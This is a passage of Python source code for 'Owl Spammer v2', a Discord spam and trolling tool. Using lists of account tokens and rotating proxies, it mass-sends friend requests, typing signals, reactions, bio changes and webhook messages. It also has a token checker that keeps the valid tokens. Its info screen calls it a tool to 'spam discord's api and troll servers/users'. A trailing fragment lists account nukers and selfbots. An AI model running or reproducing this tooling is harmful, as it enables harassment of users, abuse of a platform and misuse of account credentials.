                    tk = "*" * len(token)

                randomProxy = ''
                if self.proxyless == False:
                    randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

                async with ClientSession(headers=headers) as session:
                    async with session.post(
                            "https://discord.com/api/v9/users/@me/relationships",
                            json={"discriminator": userDiscrim, "username": userName}, proxy=randomProxy) as r:
                        
                        if r.status == 204:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} successfully friended!\n' +
                                Fore.RESET)
                        elif r.status == 400:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} couldn\'t friend, invalid user!\n' +
                                Fore.RESET)
                        else:
                            text = await r.text()
                            if "You need to verify your account" in text:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} is unverified and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif "Unauthorized" in text:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} is invalid and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            else:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} failed to friend!\n' +
                                    Fore.RESET)
            elif type == 'remove':
                headers = {
                    "Authorization":
                    token,
                    "accept":
                    "*/*",
                    "accept-language":
                    "en-US",
                    "connection":
                    "keep-alive",
                    "cookie":
                    f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                    "DNT":
                    "1",
                    "origin":
                    "https://discord.com",
                    "sec-fetch-dest":
                    "empty",
                    "sec-fetch-mode":
                    "cors",
                    "sec-fetch-site":
                    "same-origin",
                    "referer":
                    "https://discord.com/channels/@me",
                    "TE":
                    "Trailers",
                    "User-Agent":
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                    "X-Super-Properties":
                    "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                tk = token
                try:
                    tk = token[:25] + "*" * 34
                except:
                    tk = "*" * len(token)

                randomProxy = ''
                if self.proxyless == False:
                    randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

                async with ClientSession(headers=headers) as session:
                    async with session.delete(
                            "https://discord.com/api/v9/users/@me/relationships/" + userTag_Or_id, proxy=randomProxy) as r:
                        
                        if r.status == 204:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} successfully unfriended!\n' +
                                Fore.RESET)
                        elif r.status == 400:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} couldn\'t unfriend, invalid id!\n' +
                                Fore.RESET)
                        else:
                            text = await r.text()
                            if "You need to verify your account" in text:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} is unverified and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            elif "Unauthorized" in text:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} is invalid and removed from list!\n'
                                    + Fore.RESET)
                                if token in self.tokens:
                                    self.tokens.remove(token)
                            else:
                                print(
                                    '\n                                       '
                                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                    Fore.BLUE + '] ' + Fore.CYAN +
                                    f'{tk} failed to unfriend!\n' +
                                    Fore.RESET)
        
        async def screen7(self):
            try:
                await self.rpc.update(state="Typing Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen7')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide the channel id: ',
                end='')
            chId = input()
            if chId == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using Typing Spammer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.typingSpammer(token, chId))
            await asyncio.sleep(5)
            await self.start()
            
        async def typingSpammer(self, token, chId):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.post(
                        "https://discord.com/api/v9/channels/" + chId + '/typing', proxy=randomProxy) as r:
                    
                    if r.status == 204:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} successfully started typing!\n' +
                            Fore.RESET)
                    elif r.status == 400:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} couldn\'t start typing!\n' +
                            Fore.RESET)
                    else:
                        text = await r.text()
                        if "You need to verify your account" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is unverified and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        elif "Unauthorized" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is invalid and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        else:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} failed to start typing!\n' +
                                Fore.RESET)

        async def screen8(self):
            try:
                await self.rpc.update(state="Bio Changer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen8')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide the new bio: ',
                end='')
            bio = input()
            if bio == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using Bio Changer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.bioChanger(token, bio))
            await asyncio.sleep(5)
            await self.start()
        
        async def screen9(self):
            try:
                await self.rpc.update(state="Webhook Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen9')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide the webhook url: ',
                end='')
            webhookUrl = input()
            if webhookUrl == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide the message: ',
                end='')
            msg = input()
            if msg == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Amount: ',
                end='')
            amount = input()
            try:
                await self.rpc.update(state="Using Webhook Changer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for i in range(int(amount)):
                    await pool.put(self.webhookSpammer(webhookUrl, msg))
            await asyncio.sleep(5)
            await self.start()
        
        async def webhookSpammer(self, webhookUrl, msg):
            headers = {
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.post(
                        webhookUrl, proxy=randomProxy, json={"content": msg}) as r:
                    if r.status == 204:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Successfully sent message!\n' +
                            Fore.RESET)
                    else:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Failed to send message!\n' +
                            Fore.RESET)

        async def screen10(self):
            try:
                await self.rpc.update(state="Reaction Spammer Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen10')
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide channel id: ',
                end='')
            chId = input()
            if chId == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide message id: ',
                end='')
            msgId = input()
            if msgId == '0':
                await self.start()
            print('\n                                       ' + Fore.BLUE + '[' +
                Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Please provide reaction (for normal use \:emoji:, for others use name:id): ',
                end='')
            emoji = input()
            if emoji == '0':
                await self.start()
            try:
                await self.rpc.update(state="Using Reaction Spammer", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.reactionSpammer(token, chId, msgId, emoji))
            await asyncio.sleep(5)
            await self.start()

        async def reactionSpammer(self, token, chId, msgId, emoji):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.put(
                        "https://discord.com/api/v9/channels/%s/messages/%s/reactions/%s/@me" % (
                            chId,
                            msgId,
                            emoji
                        ), proxy=randomProxy) as r:
                    
                    if r.status == 204:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} successfully reacted!\n' +
                            Fore.RESET)
                    elif r.status == 404:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} couldn\'t react, {r.reason}!\n' +
                            Fore.RESET)
                    elif r.status == 400:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} couldn\'t react, Unknown Emoji!\n' +
                            Fore.RESET)
                    else:
                        text = await r.text()
                        if "You need to verify your account" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is unverified and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        elif "Unauthorized" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is invalid and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        else:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} failed to react!\n' +
                                Fore.RESET)

        async def bioChanger(self, token, bio):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            async with ClientSession(headers=headers) as session:
                async with session.patch(
                        "https://discord.com/api/v9/users/@me", json={"bio": bio}, proxy=randomProxy) as r:
                    
                    if r.status == 200:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} successfully changed bio!\n' +
                            Fore.RESET)
                    elif r.status == 400:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} couldn\'t change bio!\n' +
                            Fore.RESET)
                    else:
                        text = await r.text()
                        if "You need to verify your account" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is unverified and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        elif "Unauthorized" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is invalid and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        else:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} failed to change bio!\n' +
                                Fore.RESET)

        async def screen11(self):
            try:
                await self.rpc.update(state="Token Checker Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen11')
            print(
                '                                       '
                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                Fore.BLUE + '] ' + Fore.CYAN +
                f'Checking Tokens...' +
                Fore.RESET)
            try:
                await self.rpc.update(state="Using Token Checker", details="", large_image="default")
            except:
                pass
            async with TaskPool(5_000) as pool:
                for token in self.tokens:
                    await pool.put(self.tokenChecker(token))
            while self.checked == False:
                pass
            else:
                print(
                    '                                       '
                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                    Fore.BLUE + '] ' + Fore.CYAN +
                    f'Checked tokens. Valid = {len(self.checked)} ~ Total = {len(self.totalChecked)}' +
                    Fore.RESET)
                print(
                    '                                       '
                    + Fore.BLUE + '[' + Fore.CYAN + '/' +
                    Fore.BLUE + '] ' + Fore.CYAN +
                    f'Do you want to save them in separate file? [Y/N]: ' +
                    Fore.RESET, end='')
                resp = input()
                if resp.lower() == 'y':
                    added = 0
                    with open('owl-data/checked.txt', 'w') as f:
                        for t in self.checked:
                            f.write(t + '\n')
                            added += 1
                    while added != len(self.checked):
                        pass
                    else:
                        print(
                            '                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Saved new tokens in owl-data/checked.txt.' +
                            Fore.RESET)
                        print(
                            '                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Do you want to go back? [Y/N]: ' +
                            Fore.RESET, end='')
                        r = input()
                        if r.lower() == 'y':
                            self.checked = []
                            self.totalChecked = []
                            await self.start()
                        else:
                            self.exit()
                else:
                    added = 0
                    open('tokens.txt', 'w').close()
                    with open('tokens.txt', 'w') as f:
                        for t in self.checked:
                            f.write(t + '\n')
                            added += 1
                    while added != len(self.checked):
                        pass
                    else:
                        print(
                            '                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Replaced with new tokens in tokens.txt.' +
                            Fore.RESET)
                        print(
                            '                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'Do you want to go back? [Y/N]: ' +
                            Fore.RESET, end='')
                        r = input()
                        if r.lower() == 'y':
                            self.checked = []
                            self.totalChecked = []
                            await self.start()
                        else:
                            self.exit()
            
        async def tokenChecker(self, token):
            headers = {
                "Authorization":
                token,
                "accept":
                "*/*",
                "accept-language":
                "en-US",
                "connection":
                "keep-alive",
                "cookie":
                f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
                "DNT":
                "1",
                "origin":
                "https://discord.com",
                "sec-fetch-dest":
                "empty",
                "sec-fetch-mode":
                "cors",
                "sec-fetch-site":
                "same-origin",
                "referer":
                "https://discord.com/channels/@me",
                "TE":
                "Trailers",
                "User-Agent":
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
                "X-Super-Properties":
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }
            tk = token
            try:
                tk = token[:25] + "*" * 34
            except:
                tk = "*" * len(token)

            randomProxy = ''
            if self.proxyless == False:
                randomProxy = self.proxies[random.randint(0, len(self.proxies)-1)]

            self.totalChecked.append(token)
            async with ClientSession(headers=headers) as session:
                async with session.get(
                        "https://discord.com/api/v9/users/@me/library", proxy=randomProxy) as r:
                    
                    if r.status == 200:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} is valid!\n' +
                            Fore.RESET)
                        self.checked.append(token)
                    elif r.status == 400:
                        print(
                            '\n                                       '
                            + Fore.BLUE + '[' + Fore.CYAN + '/' +
                            Fore.BLUE + '] ' + Fore.CYAN +
                            f'{tk} couldn\'t check!\n' +
                            Fore.RESET)
                    else:
                        text = await r.text()
                        if "You need to verify your account" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is locked and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        elif "Unauthorized" in text:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} is invalid and removed from list!\n'
                                + Fore.RESET)
                            if token in self.tokens:
                                self.tokens.remove(token)
                        else:
                            print(
                                '\n                                       '
                                + Fore.BLUE + '[' + Fore.CYAN + '/' +
                                Fore.BLUE + '] ' + Fore.CYAN +
                                f'{tk} failed to check!\n' +
                                Fore.RESET)

        async def screen12(self):
            try:
                await self.rpc.update(state="Contact & Info Screen", details="", large_image="default")
            except:
                pass
            clear()
            self.sendText('screen12')
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Contact: https://discord.gg/2aF8RDJxct')
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Website: https://sites.google.com/view/owlspammer/home')
            print(" ")
            print(
                Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' + Fore.CYAN +
                'Info: Hello User, This is Owl Spammer, a new spammer for discord. This tool is for spamming discord\'s api and troll servers/users. We want this to be famous and yeah, hope you like it <3.'
            )
            print(" ")
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                Fore.CYAN + 'Do you want to go back? [Y/N] > ',
                end='')
            goBack = input()
            if goBack == '0':
                await self.start()
            elif goBack.lower() == 'y':
                await self.start()
            else:
                print(" ")
                self.exit()

        def exit(self):
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                    Fore.CYAN + "Thank you for using Owl Spammer")
            exit()

        def sendText(self, screen='main'):
            print(Fore.CYAN, end='')
            print(
                '   ____           _    _____                                           '
                .center(self.center))
            print(
                '  / __ \         | |  / ____|                                          '
                .center(self.center))
            print(
                ' | |  | |_      _| | | (___  _ __   __ _ _ __ ___  _ __ ___   ___ _ __ '
                .center(self.center))
            print(
                ' | |  | \ \ /\ / / |  \___ \| \'_ \ / _` | \'_ ` _ \| \'_ ` _ \ / _ \ \'__|'
                .center(self.center))
            print(
                ' | |__| |\ V  V /| |  ____) | |_) | (_| | | | | | | | | | | |  __/ |   '
                .center(self.center))
            print(
                '  \____/  \_/\_/ |_| |_____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_| v2'
                .center(self.center))
            print(
                '                            | |                                        '
                .center(self.center))
            if screen == 'main':
                print(
                    '                            |_|                                        '
                    .center(self.center))

            elif screen == 'screen1':
                print(
                    '         Server Joiner      |_|                                        '
                    .center(self.center))
            elif screen == 'screen2':
                print(
                    '         Server Leaver      |_|                                        '
                    .center(self.center))
            elif screen == 'screen3':
                print(
                    '        Channel Spammer     |_|                                        '
                    .center(self.center))
            elif screen == 'screen4':
                print(
                    '        Nickname Changer    |_|                                        '
                    .center(self.center))
            elif screen == 'screen5':
                print(
                    '           DM Spammer       |_|                                        '
                    .center(self.center))
            elif screen == 'screen6':
                print(
                    '         Friend Spammer     |_|                                        '
                    .center(self.center))
            elif screen == 'screen7':
                print(
                    '         Typing Changer      |_|                                        '
                    .center(self.center))
            elif screen == 'screen8':
                print(
                    '          Bio Changer       |_|                                        '
                    .center(self.center))
            elif screen == 'screen9':
                print(
                    '        Webhook Spammer     |_|                                        '
                    .center(self.center))
            elif screen == 'screen10':
                print(
                    '        Reaction Spammer    |_|                                        '
                    .center(self.center))
            elif screen == 'screen11':
                print(
                    '          Token Checker     |_|                                        '
                    .center(self.center))
            elif screen == 'screen12':
                print(
                    '         Contact & Info     |_|                                        '
                    .center(self.center))
            print(Fore.RESET)
            print((Fore.MAGENTA + '                            Developed by ' +
                Fore.BLUE + 'Geb ♡#0001' + Fore.MAGENTA + ',' + Fore.BLUE +
                ' StarlexDev#7902' + Fore.RESET).center(self.center))
            print(' ')

    class Auth():
        async def start(self):
            try:
                client_id = '867789446769934386'
                rpc = AioPresence(client_id)
                await rpc.connect()
            except:
                pass
            owl = OWL(rpc)
            await owl.start()
            time.sleep(0.2)
            alreadyPut == None
            if alreadyPut == None:
                print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                        Fore.CYAN + 'Please provide your serial number from order: ' + Fore.RESET, end='')
                serialNmbr = input()
                try:
                    print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                                Fore.CYAN + 'Checking...' + Fore.RESET)
                    mongo = pymongo.MongoClient(f'mongodb+srv://{serialNmbr}:owlspammer@rikocluster.5sh7t.mongodb.net/OwlSpammer?retryWrites=true&w=majority')
                    mongo.admin.command('ping')
                    time.sleep(0.5)
                    with open(f'{appdata}/OwlSpammer/serial_number.txt', 'w') as f:
                        f.write('# DO NOT SEND IT TO ANYONE\n' + serialNmbr)
                    try:
                        await rpc.update(state="Waiting for Proxy Confirmation...", details="", large_image="default")
                    except:
                        pass
                    mongo.close()
                    owl = OWL(rpc)
                    await owl.start()
                except OperationFailure:
                    self.exit()
        def exit(self):
            print(Fore.BLUE + '[' + Fore.CYAN + '/' + Fore.BLUE + '] ' +
                            Fore.CYAN + 'Not a correct serial number!' + Fore.RESET)
            exit()

    auth = Auth()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(auth.start())
        



      




def discordvirgin():
  designaz()
  print(f"""
  {random.choice(cuh)}
   _.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._
 ,'_.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._.-._`.

{random.choice(cuh)}
 1. Account Nuker{random.choice(cuh)}
 2. Eagle Nuker V1.1 (Full Customization){random.choice(cuh)}
 3. Arsky SelfBot{random.choice(cuh)}
 4. Eagle SelfBot (LINK){random.choice(cuh)}
 5. Webhook Spammer{random.choice(cuh)}
 6. Webhook Deleter {random.choice(cuh)}
